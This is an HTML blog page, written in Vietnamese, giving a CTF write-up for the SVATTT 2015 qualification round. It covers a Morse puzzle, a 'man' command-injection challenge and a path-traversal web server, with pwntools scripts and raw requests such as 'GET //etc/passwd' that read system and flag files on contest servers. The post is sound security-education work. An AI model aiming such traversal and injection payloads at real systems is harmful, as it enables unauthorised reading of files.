@@ -1,0 +1,367 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Vòng Loại Sinh Viên Với an Toàn Thông Tin 2015 - Writeups - punMag</title>
+  <meta name="author" content="Tung Pun">
+
+  
+  <meta name="description" content="Sinh viên với An toàn thông tin 2015 là một kì thi cho sinh viên được tổ chức dưới dạng các bài thi CTF kết hợp với những challenge lý thuyết - chúng &hellip;">
+  
+
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+  
+  <link rel="canonical" href="http://tungpun.github.io/blog/2015/11/07/svattt2015-qualification">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="punMag" type="application/atom+xml">
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="http://fonts.useso.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="http://fonts.useso.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+  <script type="text/javascript">
+    var _gaq = _gaq || [];
+    _gaq.push(['_setAccount', 'UA-66338962-1']);
+    _gaq.push(['_trackPageview']);
+
+    (function() {
+      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    })();
+  </script>
+
+  
+</head>
+
+<body   >
+  <div id="sidebar_control"></div>
+  <div id="sidebar">
+    <div class="logo">
+       .pM
+    </div>
+    <div class="content hide">
+      <section role="navigation">
+        <header role="banner"><hgroup>
+  <h1><a href="/"><font size="4px">by</font> Tung Pun</a></h1>
+</hgroup>
+
+</header>
+        
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:tungpun.github.io" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+
+<hr/>
+<!--<ul class="main-navigation">
+  <li><a href="/">home</a></li>
+  <li><a href="//wg.dotkrnl.com/p/public">public</a></li>
+</ul>
+-->
+
+      </section>
+      
+        <section>
+  <h2>recent</h2>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2016/07/19/abctf-encryption-service-writeup/">ABCTF - Encryption Service - Writeup</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/11/07/svattt2015-qualification/">Vòng Loại Sinh Viên Với an Toàn Thông Tin 2015 - Writeups</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/10/07/dctf-writeup/">DefCamp CTF 2015 - Writeup</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/09/22/writeup-csaw-ctf-2015-pwn-precision/">Writeup | CSAW CTF 2015 - Pwn - Precision</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/09/09/write-up--mmactf-2015-pwn-rps/">Write Up | MMACTF 2015 - Pwn - RPS</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+      
+    </div>
+  </div>
+  <div id="main">
+    <div class="content">
+      <article class="hentry" role="article">
+  
+  
+    <header>
+      <div class="back"><a href="/" onclick="history.go(-1);return false;">← Back</a></div>
+      <h1 class="entry-title">Vòng Loại Sinh Viên Với an Toàn Thông Tin 2015 - Writeups</h1>
+    </header>
+  
+  <div class="entry-content"><p>Sinh viên với An toàn thông tin 2015 là một kì thi cho sinh viên được tổ chức dưới dạng các bài thi CTF kết hợp với những challenge lý thuyết - chúng ta có thể giải được bằng các kĩ thuật recon ;))</p>
+
+<p>Trong vòng loại, team mình là Animal.OhYeah (viết liền, không có dấu cách) có thứ hạng cũng khá cao #firstPlace nên hôm nay mình cũng có chút động lực để chia sẻ. Mọi lần mình viết bằng Tiếng Anh, nhưng mà mình viết chán quá đọc chả ai hiểu cả, nên lần này mình quyết định viết bằng tiếng Việt.</p>
+
+<p>Trong vòng thi vừa rồi, mình hỗ trợ các bạn khác trong nhóm giải các lây hỏi lý thuyết trắc nghiệm, hai bài exploit 100, bài hidden 100, tự mình không giải được bài nào cả.</p>
+
+<p>Hiện tại tính đến thời điểm mình viết bài thì các challenge vẫn available tại <a href="http://svattt.vnsecurity.net/">đây</a></p>
+
+<h2>Misc 100 - Quảng Ngãi :: Hidden</h2>
+
+<pre><code>Hidden
+CTF :)
+</code></pre>
+
+<p><a href="http://119.15.167.211/static/materials/misc100.html_659ff899f5bb31242424b127aafb9a35">Read this.</a></p>
+
+<p>Bọn mình download file kia về, copy một đoạn để tìm file gốc trên google, sau đó quan sát và phát hiện giữa hai file có một số kí tự bị thay đổi là <code>-</code>, <code>.</code> và <code></code> .</p>
+
+<blockquote><p>Morse code ?</p></blockquote>
+
+<p>Mình quyết định viết thử tool, còn bạn mình thì (trâu bò) dùng tay. Cuối cùng thì tool mình chạy sai không ra, bạn mình có kết quả trước.</p>
+
+<p>Flag: <code>SVATTTM0RS3</code></p>
+
+<h2>Exploit 100 - Hoàng Sa ::  int i = 0;</h2>
+
+<pre><code>int i = 0;
+Hint: &lt; &gt; ! @ # $ % ^ `
+nc 119.15.167.212 31338
+</code></pre>
+
+<p><a href="http://119.15.167.211/static/materials/exp100.c_a0a271df98aec280f58bb5cfd9991709">Source</a></p>
+
+<p>Bài này một bạn trong team mình reverse, sau đó kêu mình cứ ghi tràn 128 bytes <code>null</code> và sau đó có thể gửi dữ liệu vào được.
+Dữ liệu vào sẽ được ghép vào hàm <code>man</code> và thực thi như sau:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>"man " + input</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Mình chạy sang xem qua thì thấy filter một vài ký tự :</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>if(strchr(buffer,'-')!=0) return 0;
+</span><span class='line'>if(strchr(buffer,';')!=0) return 0;
+</span><span class='line'>if(strchr(buffer,'|')!=0) return 0;
+</span><span class='line'>if(strchr(buffer,'&')!=0) return 0;
+</span><span class='line'>if(strchr(buffer,' ')!=0) return 0;
+</span><span class='line'>if(strchr(buffer,'\t')!=0) return 0;
+</span><span class='line'>if(strchr(buffer,'\n')!=0) return 0;
+</span><span class='line'>if(strchr(buffer,'\r')!=0) return 0;
+</span><span class='line'>if(strchr(buffer,'\'')!=0) return 0;
+</span><span class='line'>if(strchr(buffer,'"')!=0) return 0;</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Mình nghĩ đến <code>-l</code> , nhưng không được. Bí quá guessing thử <code>/home/exp100/flag.txt</code> thì ok. Mình cũng chả biết tại sao +_+</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>from pwn import *
+</span><span class='line'>try:
+</span><span class='line'>    r = remote('119.15.167.212', 31338)    
+</span><span class='line'>    print r.recvuntil(':')
+</span><span class='line'>    r.send('\x00' * 128)
+</span><span class='line'>    print r.recvuntil('&gt; ')
+</span><span class='line'>    r.send('/home/exp100/flag.txt')
+</span><span class='line'>    print r.recv(1000)
+</span><span class='line'>except Exception, e:
+</span><span class='line'>    print e</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We have flag: <code>SVATTT_has_just_begun</code></p>
+
+<p>Hôm nay viết bài, mình mới thấy cái hint, và cũng không rõ cái hint đó có ý nghĩa gì :/</p>
+
+<h2>Exploit 100 - Hải Phòng :: Weird HTTP</h2>
+
+<pre><code>Weird HTTP
+I really love C &lt;3.
+One byte to rule them all.
+http://119.15.167.212:31335/index.html
+</code></pre>
+
+<p>Nói đến bài này, thì phải bắt đầu từ lúc đồng đội mình gửi cho mình cách <code>nc 119.15.167.212 31335</code> (IP và địa chỉ của kì thi lúc đó có thể sẽ khác), sau đó chèn thêm đoạn payload <code>GET /index.php HTTP/1.1</code> có kết quả.</p>
+
+<p>Mình thử thay bằng <code>GET //etc/passwd HTTP/1.1</code> thì có thêm vài thông tin thú vị.</p>
+
+<p>Mình thay tiếp thành <code>GET //home/exp100-python/flag HTTP/1.1</code> thì có flag :o</p>
+
+<blockquote><p>Awesome&hellip; (.______.&ldquo;)</p></blockquote>
+
+<p>Dưới đây là code pwn của mình :v (vì đây là bài pwn mà :( )</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>from pwn import *
+</span><span class='line'>
+</span><span class='line'>try:    
+</span><span class='line'>    r = remote('119.15.167.212', 31335)    
+</span><span class='line'>    code = 'GET //home/exp100-python/flag' + ' HTTP/1.1'    
+</span><span class='line'>    r.send(code)
+</span><span class='line'>    print r.recv()    
+</span><span class='line'>    print r.recv()        
+</span><span class='line'>except Exception, e:
+</span><span class='line'>    print e</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Flag: <code>SVATTT_u_got_easter_egg</code></p>
+
+<blockquote><p>Have fun and Happy hacking</p></blockquote>
+</div>
+  <footer>
+    <div class="articlemeta">
+      <span class="hide">
+        
+
+ @
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2015-11-07T14:17:10+07:00" pubdate data-updated="true"></time>
+      </span>
+      <span class="plus">
+        
+          <a href="#">+</a>
+        
+      </span>
+    </div>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://tungpun.github.io/blog/2015/11/07/svattt2015-qualification/" data-via="tungpun_" data-counturl="http://tungpun.github.io/blog/2015/11/07/svattt2015-qualification/" >Tweet</a>
+  
+  
+  
+    <div class="fb-like" data-send="true" data-width="450" data-show-faces="false"></div>
+  
+</div>
+
+    
+    <div class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2015/10/07/dctf-writeup/" title="Previous Post: DefCamp CTF 2015 - Writeup">&laquo; DefCamp CTF 2015 - Writeup</a>
+      
+    </div>
+  </footer>
+
+
+</article>
+
+
+    </div>
+    <footer role="contentinfo"><div class="content">
+  <p>    
+    Find me on <a href="https://twitter.com/tungpun_">Twitter</a>
+  </p>
+</div>
+
+</footer>
+    
+
+
+
+<div id="fb-root"></div>
+<script>(function(d, s, id) {
+  var js, fjs = d.getElementsByTagName(s)[0];
+  if (d.getElementById(id)) {return;}
+  js = d.createElement(s); js.id = id; js.async = true;
+  js.src = "//connect.facebook.net/en_US/all.js#appId=212934732101925&xfbml=1";
+  fjs.parentNode.insertBefore(js, fjs);
+}(document, 'script', 'facebook-jssdk'));</script>
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+  </div>
+  <script src="/javascripts/modernizr-2.0.js"></script>
+<script src="//ajax.useso.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+<script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+<script src="/javascripts/libs/respond.js" type="text/javascript"></script>
+<script src="/javascripts/octopress.js" type="text/javascript"></script>
+
+
+<script type="text/javascript">
+$(document).ready(function(){
+  var userAgent = navigator.userAgent.toLowerCase();
+  var isiPhone = (userAgent.indexOf('iphone') != -1 || userAgent.indexOf('ipod') != -1) ? true : false;
+  var isAndroid = (userAgent.indexOf('android') != -1) ? true : false;
+  clickEvent = (isiPhone || isAndroid) ? 'touchstart' : 'click';
+  $('#sidebar').on(clickEvent, function() {
+    $(this).toggleClass('open');
+  });
+  $('.articlemeta').on(clickEvent, function() {
+    toggleDisqus();
+    $(this).toggleClass('open');
+  });
+});
+</script>
+
+</body>
+</html>
